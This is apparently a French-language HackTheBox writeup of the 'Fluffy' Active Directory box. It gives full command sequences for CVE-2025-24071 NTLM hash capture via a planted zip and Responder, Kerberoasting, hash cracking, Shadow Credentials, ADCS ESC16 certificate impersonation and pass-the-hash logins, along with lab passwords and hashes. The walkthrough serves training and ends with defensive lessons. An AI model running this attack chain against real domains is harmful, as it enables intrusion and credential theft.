---
title: "Fluffy — HackTheBox Writeup"
date: 2026-03-23
description: "Writeup de la box Fluffy (Easy/Windows) sur HackTheBox — CVE-2025-24071 + Kerberoasting + ADCS ESC16 pour le privesc."
tags:
  - HackTheBox
  - HTB
  - Easy
  - Windows
  - Active Directory
  - Kerberoasting
  - ADCS
  - ESC16
  - CVE-2025-24071
  - Privilege Escalation
categories:
  - Writeups
  - HackTheBox
draft: false
---

## Introduction

Fluffy est une box Windows de difficulté Easy sur HackTheBox. Elle expose un contrôleur de domaine Active Directory avec plusieurs services classiques (DNS, Kerberos, LDAP, SMB). L'exploitation repose sur la CVE-2025-24071 pour capturer un hash NTLMv2 via un partage SMB, puis une chaîne d'attaques AD (GenericAll, Shadow Credentials, ADCS ESC16) permet d'obtenir les privilèges administrateur du domaine.

---

## Reconnaissance

### Scan Nmap

```bash
nmap -Pn -sV -sC 10.129.232.88
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
Service Info: Host: DC01; OS: Windows
```

On identifie un contrôleur de domaine **DC01.fluffy.htb** avec l'ensemble des services AD classiques.

### Énumération SMB

On liste les partages accessibles anonymement :

```bash
smbclient -L //10.129.232.88/ -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
IT              Disk
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

Le partage **IT** est intéressant et non standard.

### Kerberoasting

Avec les credentials de `j.fleischman` (`J0elTHEM4n1990!`), on énumère les SPNs :

```bash
sudo ntpdate -u 10.129.7.135 && \
GetUserSPNs.py fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.129.7.135 -request
```

> ⚠️ La synchronisation du temps avec `ntpdate` est nécessaire pour éviter l'erreur `KRB_AP_ERR_SKEW`.

```
ServicePrincipalName    Name       MemberOf
----------------------  ---------  ---------------------------------------------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
```

On récupère les tickets TGS pour les trois comptes de service.

### Exploration du partage IT

On se connecte au partage avec les credentials de `j.fleischman` :

```bash
smbclient //10.129.7.135/IT -U 'j.fleischman%J0elTHEM4n1990!'
```

```
smb: \> ls
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025
```

On télécharge le fichier `Upgrade_Notice.pdf` qui contient des informations sur les logiciels déployés dans l'infrastructure :

![Upgrade Notice PDF](/images/fluffy-upgrade-notice.png)

---

## Foothold

### CVE-2025-24071 — NTLMv2 Hash Leak via SMB

On utilise le PoC de la [CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071/tree/main) pour piéger un utilisateur qui consulte le partage SMB.

On génère le fichier malveillant :

```bash
python3 exploit.py -f poc -i 10.10.15.69
```

On le dépose dans le partage IT :

```bash
smbclient //10.129.7.135/IT -U 'j.fleischman%J0elTHEM4n1990!' -c "put exploit.zip"
```

On lance Responder en écoute :

```bash
sudo python3 Responder.py -I tun0
```

Après quelques instants, on capture le hash NTLMv2 de **p.agila** :

```
[SMB] NTLMv2-SSP Client   : 10.129.7.135
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:56b5056f3d4abba0:0C880CFB7385464A62B...
```

On crack le hash avec hashcat :

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```
p.agila : prometheusx-303
```

---

## User

### BloodHound — Analyse des chemins d'attaque

On collecte les données AD avec BloodHound :

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' \
  -dc 'dc01.fluffy.htb' -ns 10.129.7.135 -c All --dns-tcp
```

On marque `p.agila` comme *Owned* et on analyse les chemins d'attaque :

![BloodHound — Owned user](/images/fluffy-bloodhound-owned.png)

On regarde les objets que contrôle notre utilisateur :

![BloodHound — Outbound Object Control](/images/fluffy-bloodhound-outbound.png)

On découvre que `p.agila` possède un **GenericAll** sur le groupe **Service Accounts** :

![BloodHound — GenericAll](/images/fluffy-bloodhound-genericall.png)

### Ajout au groupe Service Accounts

Grâce au `GenericAll`, on ajoute `p.agila` dans le groupe **Service Accounts** avec BloodyAD :

```bash
bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --host 10.129.7.135 \
  add groupMember 'SERVICE ACCOUNTS' 'p.agila'
```

![BloodyAD — Ajout au groupe](/images/fluffy-bloodyad-groupmember.png)

### Shadow Credentials — Récupération des NT hashes

En tant que membre du groupe Service Accounts, on dispose d'un **GenericWrite** sur les comptes de service, ce qui permet d'utiliser l'attaque **Shadow Credentials**.

Récupération du hash NT de `ca_svc` :

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' \
  -account ca_svc -dc-ip 10.129.7.135
```

```
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Récupération du hash NT de `winrm_svc` :

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' \
  -account winrm_svc -dc-ip 10.129.7.135
```

```
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

### Connexion WinRM

Avec le hash de `winrm_svc`, on se connecte à la machine :

```bash
evil-winrm -i 10.129.7.135 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
```

🚩 **User flag obtenu.**

---

## Privilege Escalation

### ADCS — Détection de la vulnérabilité ESC16

On vérifie la présence d'ADCS :

```bash
crackmapexec ldap 10.129.7.135 -u 'winrm_svc' \
  -H '33bd09dcd697600edf6b3a7af4875767' -M adcs
```

```
ADCS        Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        Found CN: fluffy-DC01-CA
```

On lance un scan de vulnérabilités ADCS avec certipy :

```bash
certipy find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.129.7.135 -enabled -stdout -vulnerable
```

```
Certificate Authorities
  CA Name              : fluffy-DC01-CA
  DNS Name             : DC01.fluffy.htb
  [!] Vulnerabilities
    ESC16              : Security Extension is disabled.
```

La vulnérabilité **ESC16** est présente : l'extension de sécurité `szOID_NTDS_CA_SECURITY_EXT` est désactivée, ce qui permet d'usurper l'identité d'un autre utilisateur via un certificat.

### Exploitation ESC16

**Étape 1** — Modifier l'UPN de `ca_svc` pour usurper `administrator` :

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
  -user ca_svc -upn 'administrator' -dc-ip 10.129.7.135
```

```
[*] Successfully updated 'ca_svc'
```

**Étape 2** — Demander un certificat avec l'identité `administrator` :

```bash
certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.129.7.135 -target 10.129.7.135 \
  -ca 'fluffy-DC01-CA' -template 'User'
```

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

**Étape 3** — Restaurer l'UPN original de `ca_svc` :

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
  -user ca_svc -upn 'ca_svc' -dc-ip 10.129.7.135
```

**Étape 4** — S'authentifier avec le certificat et récupérer le hash NT de l'administrateur :

```bash
certipy auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.7.135
```

```
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### Connexion Administrateur

```bash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

🚩 **Root flag obtenu.**

---

## Conclusion

Cette box Easy illustre une chaîne d'attaque Active Directory complète :

1. **CVE-2025-24071** — Exploitation d'une vulnérabilité récente pour capturer un hash NTLMv2 via un partage SMB piégé
2. **BloodHound + GenericAll** — Analyse des ACLs pour identifier un chemin d'attaque vers les comptes de service
3. **Shadow Credentials** — Utilisation du GenericWrite pour obtenir les NT hashes des comptes de service
4. **ADCS ESC16** — Exploitation d'une misconfiguration de l'autorité de certification pour usurper l'identité de l'administrateur du domaine

Points clés à retenir :
- Toujours synchroniser l'horloge avec le DC (`ntpdate`) pour éviter les erreurs Kerberos
- Les droits GenericAll/GenericWrite sur des groupes AD sont des vecteurs d'escalade très puissants
- L'extension `szOID_NTDS_CA_SECURITY_EXT` doit être activée pour protéger contre ESC16
- La CVE-2025-24071 rappelle que le simple dépôt d'un fichier dans un partage peut compromettre des comptes
